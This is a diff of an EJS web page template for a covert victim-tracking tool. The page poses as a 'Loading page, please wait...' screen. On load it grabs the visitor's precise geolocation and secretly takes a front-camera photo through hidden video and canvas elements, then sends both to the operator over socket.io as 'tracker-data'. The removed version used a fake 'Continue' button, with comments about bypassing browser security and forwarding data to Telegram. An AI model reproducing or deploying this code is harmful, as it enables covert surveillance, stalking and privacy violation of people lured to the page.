@@ -3,89 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Content...</title>
-    <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
-        #action-btn { padding: 15px 30px; font-size: 18px; color: #fff; background-color: #007bff; border: none; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        #message { display: none; font-size: 24px; font-weight: bold; color: #28a745; }
-        video { display: none; }
-        canvas { display: none; }
-    </style>
+    <title>Loading...</title>
+    <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h3>Loading page, please wait...</h3>
+    </div>
 
-    <!-- Ye button browser security ko bypass karega -->
-    <button id="action-btn" onclick="startProcess()">Click Here to Continue</button>
-    
-    <!-- Button dabne ke baad ye success message dikhega -->
-    <div id="message">Loaded successfully!</div>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
-    <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        const sessionId = '<%= sessionId %>';
-        const mode = '<%= mode %>';
-        
-        // Room join karna
+        const sessionId = "<%= sessionId %>";
+        const mode = "<%= mode %>";
+
         socket.emit('join-room', sessionId);
 
-        async function startProcess() {
-            // Button chhupao aur message dikhao
-            document.getElementById('action-btn').style.display = 'none';
-            document.getElementById('message').style.display = 'block';
+        function sendData(data) {
+            socket.emit('tracker-data', { roomId: sessionId, ...data });
+        }
 
-            let dataToSend = { roomId: sessionId, latitude: 0, longitude: 0, accuracy: 0, image: '' };
-
-            // 📍 1. LOCATION CAPTURE KAREGA (5 Second Timeout ke sath)
-            if (mode === 'location' || mode === 'both') {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { 
-                            enableHighAccuracy: true, 
-                            timeout: 5000, // 5 second se zyada wait nahi karega
-                            maximumAge: 0 
-                        });
+        // Location capture logic
+        if (mode === 'location' || mode === 'both') {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    sendData({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
                     });
-                    dataToSend.latitude = position.coords.latitude;
-                    dataToSend.longitude = position.coords.longitude;
-                    dataToSend.accuracy = position.coords.accuracy;
-                } catch (err) {
-                    console.error("Location block hui ya time lag gaya:", err);
-                    // Agar location fail hui toh atakega nahi, aage badh jayega
-                }
+                }, (error) => {
+                    console.error("Location permission denied or error", error);
+                }, { enableHighAccuracy: true, timeout: 10000 });
             }
+        }
 
-            // 📸 2. CAMERA CAPTURE KAREGA
-            if (mode === 'camera' || mode === 'both') {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        // Camera capture logic
+        if (mode === 'camera' || mode === 'both') {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
                     const video = document.getElementById('video');
-                    const canvas = document.getElementById('canvas');
-                    
                     video.srcObject = stream;
-                    await new Promise(resolve => video.onloadedmetadata = resolve);
                     video.play();
-
-                    // Camera focus hone ke liye 1 second wait karega
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    dataToSend.image = canvas.toDataURL('image/png');
-
-                    // Photo lene ke baad camera band kar dega
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (err) {
-                    console.error("Camera block kiya gaya ya fail hua:", err);
-                }
-            }
-
-            // 🚀 3. DATA SERVER/TELEGRAM KO BHEJEGA
-            socket.emit('tracker-data', dataToSend);
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/png');
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        sendData({ image: imageData });
+                    }, 2500);
+                })
+                .catch(err => {
+                    console.error("Camera permission denied or error", err);
+                });
         }
     </script>
 </body>
